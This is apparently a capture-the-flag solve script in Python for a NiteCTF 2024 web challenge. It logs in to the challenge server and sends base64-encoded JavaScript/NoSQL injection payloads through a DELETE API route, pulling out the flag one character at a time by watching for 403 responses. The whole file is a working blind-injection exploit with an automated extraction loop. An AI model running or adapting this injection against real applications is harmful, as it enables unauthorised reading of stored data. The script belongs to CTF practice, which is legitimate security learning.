import requests
import base64

url = "https://tammys-tantrums.chalz.nitectf2024.live/"
url2 = "api/v1/tantrums/"

token = 'cookie placeholder'
# the double-quotes start the string, the single quotes exist inside the string for the injection
# NOTE: CAPITALIZE THE 'W' IN .startsWith
payloadbegin = "' || this.description.startsWith('"
# INCORRECT! anything works for a payload NOTE: payloadend can have anything random in it from './src/lib/models/Tantrum.ts' that makes up the bubble
payloadend = "') || '1337' =='"
flag = "nite{"



if __name__=='__main__':
    login_cred = {
        'username': 'randooooooooo',
        'password': 'randooooooooo'
    }
    session = requests.Session()
    # api/v1/register line 33 is why you send it as json, not data
    session.post(f'{url}api/v1/register', json=login_cred)
    # api/v1/login line 34 for the same reason
    session.post(f'{url}api/v1/login', json=login_cred)
    
    # need to use the token otherwise the server won't let the payload go through
    token = session.cookies['token']
    # NOTE: must mark it as "token" because the server looks for that specific named token
    cookie = {"token": token}
    # print(token)
    
    # official writeup says need '_' for spaces & '}' only to get the flag
    testString = "abcdefghijklmnopqrstuvwxyz" + "ABCDEFGHIJKLMNOPQRSTUVWXYZ" + "0123456789" + "+-=_}"

    # print(payloadbegin + flag + payloadend)
    
    while True:
        for char in testString:
            # encode payload to UTF-8, then b64encode it, then turn it back into a string
            payloadString = (payloadbegin + flag + char + payloadend)
            payloadEncoded = (base64.b64encode(payloadString.encode())).decode()
            # .delete will enter the method, just give it the right route
            response = session.delete(f"{url}{url2}{payloadEncoded}", cookies=cookie)
            # print("trying:    " + payloadString)
            if response.status_code == 403:
                flag += char
                print(char)
                break
            
            # not sure it's necessary, but should end it quick in case there's lots of filler text leading to a timeout
            if '}' in flag:
                print(flag)
                exit()
            
    
    